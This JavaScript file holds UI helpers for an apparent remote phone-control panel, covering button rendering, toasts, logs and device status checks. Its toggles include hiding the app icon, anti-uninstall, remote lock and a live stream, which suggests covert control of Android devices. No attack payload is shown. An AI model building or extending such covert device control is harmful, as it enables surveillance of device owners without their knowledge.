function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#39;");
}

function uid(prefix = "id") {
    return `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
}

function setHtmlIfChanged(node, html) {
    if (!node) return false;
    // Clean whitespace for more accurate comparison
    const cleanHtml = html.trim();
    if (node.__renderedHtml === cleanHtml) return false;

    // Optimasi Lucide: Hanya set dirty jika HTML mengandung atribut data-lucide
    if (cleanHtml.includes("data-lucide")) {
        dom.iconsDirty = true;
    }

    node.innerHTML = cleanHtml;
    node.__renderedHtml = cleanHtml;
    return true;
}

function getModalSignature(modal) {
    if (!modal) return "";
    // Jika modal adalah stream, tambahkan status stream ke signature agar UI terupdate saat koneksi berhasil
    if (modal.type === "stream") {
        return JSON.stringify(modal) + state.stream.status;
    }
    return JSON.stringify(modal);
}

function formatLogTime(value = new Date()) {
    return new Intl.DateTimeFormat("en-GB", {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
    }).format(value);
}

function isOnline(device) {
    if (!device?.last_seen) return false;
    return Date.now() - new Date(device.last_seen).getTime() < 35000;
}

function ago(value) {
    if (!value) return "--";
    const diff = Math.max(0, Math.floor((Date.now() - new Date(value).getTime()) / 1000));
    if (diff < 60) return `${diff}s`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h`;
    return `${Math.floor(diff / 86400)}d`;
}

function selectedDeviceReady() {
    return Boolean(state.data.selectedDeviceId && state.data.selectedDevice);
}

function getSelectedDeviceControlStates() {
    const deviceId = state.data.selectedDeviceId;
    if (!deviceId) return {};
    return state.data.controlStatesByDevice[deviceId] || {};
}

function getToggleConfig(toggleKey) {
    return TOGGLE_ACTIONS[toggleKey] || null;
}

function isToggleActive(toggleKey) {
    const toggle = getToggleConfig(toggleKey);
    if (!toggle) return false;

    // 1. Prioritas utama: Status Lokal (Optimistic UI)
    // Jika user baru saja mengklik, kita gunakan status lokal agar instan
    const controlStates = getSelectedDeviceControlStates();
    if (controlStates[toggle.stateKey] !== undefined) {
        return controlStates[toggle.stateKey];
    }

    // 2. Prioritas kedua: Status dari APK di database
    const device = state.data.selectedDevice;
    if (device && device.status) {
        const s = (typeof device.status === "string") ? JSON.parse(device.status) : device.status;
        if (toggleKey === 'lock' && (s.is_locked !== undefined || s.locked !== undefined)) {
            return s.is_locked ?? s.locked;
        }
        if (toggleKey === 'flashlight' && (s.flashlight_on !== undefined || s.flashlightOn !== undefined)) {
            return s.flashlight_on ?? s.flashlightOn;
        }
        if (toggleKey === 'hideIcon' && (s.icon_hidden !== undefined || s.iconHidden !== undefined)) {
            return s.icon_hidden ?? s.iconHidden;
        }
        if (toggleKey === 'antiUninstall' && (s.anti_uninstall !== undefined || s.antiUninstall !== undefined)) {
            return s.anti_uninstall ?? s.antiUninstall;
        }
    }

    return toggle.defaultValue;
}

function resolveToggleAction(toggleKey) {
    const toggle = getToggleConfig(toggleKey);
    if (!toggle) return null;
    const active = isToggleActive(toggleKey);
    const mode = active ? toggle.on : toggle.off;

    return {
        key: toggleKey,
        type: "toggle-command",
        icon: mode.icon,
        label: mode.label,
        command: mode.command,
        isActive: active
    };
}

function setState(patch) {
    if (patch.auth) state.auth = { ...state.auth, ...patch.auth };
    if (patch.ui) state.ui = { ...state.ui, ...patch.ui };
    if (patch.data) state.data = { ...state.data, ...patch.data };
    if (patch.stream) state.stream = { ...state.stream, ...patch.stream };
    UI.render();
}

function addLogEntry(message, kind = "normal") {
    const entry = {
        id: uid("log"),
        message,
        kind,
        time: formatLogTime()
    };

    setState({
        ui: {
            logs: [...state.ui.logs.slice(-119), entry]
        }
    });
}

function showLoader(show) {
    dom.loader.classList.toggle("hidden", !show);
}

function addToast(text, kind = "ok") {
    const toast = { id: uid("toast"), text: String(text).slice(0, 200), kind };

    // Use setState for consistency and reactivity
    setState({ ui: { toasts: [toast] } });

    // Toast lifecycle: 2.5s display + 0.4s fade out
    setTimeout(() => {
        const el = document.querySelector(`[data-toast-id="${toast.id}"]`);
        if (el) el.classList.add('fade-out');

        setTimeout(() => {
            // Only clear if this specific toast is still active
            if (state.ui.toasts.length > 0 && state.ui.toasts[0].id === toast.id) {
                setState({ ui: { toasts: [] } });
            }
        }, 400);
    }, 2500);
}

function removeToast(toastId) {
    if (!state.ui.toasts.some((item) => item.id === toastId)) return;
    setState({ ui: { toasts: state.ui.toasts.filter((item) => item.id !== toastId) } });
}

function closeModal() {
    if (!state.ui.modal) return;
    setState({ ui: { modal: null } });
}

async function safeQuery(label, task, options = {}) {
    const timeoutMs = options.timeout || 12000;
    try {
        const result = await Promise.race([
            task(),
            new Promise((_, reject) => setTimeout(() => reject(new Error("Request timeout")), timeoutMs))
        ]);
        if (result?.error) throw result.error;
        return result;
    } catch (error) {
        console.error(label, error);
        const msg = error.message || `${label} failed`;
        if (!options.silent) addToast(msg, "error");
        return { success: false, error: msg };
    }
}

function buildActionButton(action) {
    // Role based filtering
    if (action.vipOnly && state.auth.role === "user" && !state.auth.isAdmin) {
        return "";
    }

    const finalAction = action.type === "toggle-command"
        ? resolveToggleAction(action.key)
        : action;
    if (!finalAction) return "";

    const active = action.type === "toggle-command" ? isToggleActive(action.key) : false;
    const valueStr = escapeHtml(finalAction.value || "");
    const actionStr = finalAction.type;

    // Check if this specific button is in loading state
    const isBtnLoading = state.ui.loadingButtons.has(`${actionStr}:${valueStr}`);

    // Check permission status
    let statusBadge = "";
    if (action.permKey) {
        const device = state.data.selectedDevice;
        const status = (typeof device?.status === "string") ? JSON.parse(device.status) : (device?.status || {});
        let isGranted = false;

        if (action.permKey === "permissions_granted") {
            isGranted = status.permissions_granted;
        } else {
            isGranted = status.permissions?.[action.permKey];
        }

        statusBadge = `<div class="perm-status-pill ${isGranted ? "is-granted" : "is-denied"}">
            ${isGranted ? "Granted" : "Denied"}
        </div>`;
    }

    return `
        <button
            type="button"
            class="action-btn ${active ? "is-toggled" : ""} ${isBtnLoading ? "is-loading" : ""}"
            data-action="${actionStr}"
            data-value="${valueStr}"
            ${finalAction.key ? `data-toggle-key="${escapeHtml(finalAction.key)}"` : ""}
            ${finalAction.command ? `data-command="${escapeHtml(finalAction.command)}"` : ""}
            title="${escapeHtml(finalAction.label)}"
        >
            <i data-lucide="${finalAction.icon}"></i>
            <span>${escapeHtml(finalAction.label)}</span>
            ${statusBadge}
        </button>
    `;
}

